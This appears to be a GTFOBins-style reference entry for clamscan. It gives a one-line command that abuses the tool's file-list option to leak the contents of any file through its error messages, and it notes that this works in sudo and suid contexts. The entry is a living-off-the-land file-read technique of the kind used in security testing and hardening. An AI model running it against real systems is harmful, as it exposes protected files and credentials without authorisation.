---
type: gtfobin
name: clamscan
platform: Unix
functions: [file-read]
tags: [gtfobin, unix, lotl]
---

# clamscan

## file-read

```bash
touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```
_Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`._
**Contexts:** sudo, suid, unprivileged
